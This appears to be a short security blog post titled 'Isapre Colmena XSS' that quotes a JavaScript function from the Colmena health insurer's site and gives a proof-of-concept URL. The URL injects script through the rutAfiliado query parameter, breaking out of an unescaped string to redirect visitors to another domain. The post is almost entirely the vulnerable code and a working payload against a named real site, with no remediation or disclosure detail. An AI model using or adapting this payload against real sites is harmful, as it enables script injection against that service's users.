---
layout: post
author: cvxz
title:  "Isapre Colmena XSS"
date:   2020-01-23 18:12:46 -0300
categories: xss
---

{% highlight javascript %}
function verificaAcceso(){
    var rut  = null;
    
    rut = '111111111' != 'null' ? '111111111' : null;
    
    if (rut != null){
        document.getElementById("userAfiliado").value  = rut;
        document.getElementById("userAfiliado").disabled = true;
        buscarDocumentos();
    }else {
        document.getElementById("userAfiliado").value  = "";
        document.getElementById("userAfiliado").disabled = false;
    };
};
{% endhighlight %}

[https://www.colmena.cl/CDP/?rutAfiliado=';window.location="https://90.cl";//](https://www.colmena.cl/CDP/?rutAfiliado=';window.location="https://90.cl";//)